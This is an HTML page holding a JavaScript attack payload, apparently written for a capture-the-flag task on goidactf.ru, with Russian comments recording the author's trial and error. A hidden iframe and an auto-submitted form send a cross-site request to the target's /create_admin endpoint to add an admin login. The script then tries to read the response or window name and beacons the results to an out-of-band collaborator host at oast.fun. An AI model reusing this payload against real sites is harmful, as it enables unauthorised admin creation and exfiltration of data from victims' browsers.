<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = 'https://tasks.goidactf.ru:20431';
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// Попробуем получить ответ через onerror/onload
const iframe = document.createElement('iframe');
iframe.style.display = 'none';

// Пробуем загрузить ответ как HTML
iframe.src = TARGET + '/create_admin'; // GET запрос

iframe.onload = function() {
    setTimeout(() => {
        try {
            // Может быть доступ через contentWindow.document?
            const content = iframe.contentWindow.document.body.innerHTML;
            navigator.sendBeacon(COLLAB + '/iframe_load', content.substring(0, 1000));
        } catch(e) {
            // Пробуем через name
            iframe.name = 'test';
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = TARGET + '/create_admin';
            form.target = 'test';
            form.innerHTML = '<input name="new_admin_login" value="IFRAME_TEST">';
            document.body.appendChild(form);
            form.submit();
            
            // Через 3 секунды проверяем имя iframe
            setTimeout(() => {
                navigator.sendBeacon(COLLAB + '/iframe_name', iframe.contentWindow.name);
            }, 3000);
        }
    }, 1000);
};

iframe.onerror = function() {
    navigator.sendBeacon(COLLAB + '/iframe_error', 'error_loading');
};

document.body.appendChild(iframe);
</script>
</body>
</html>
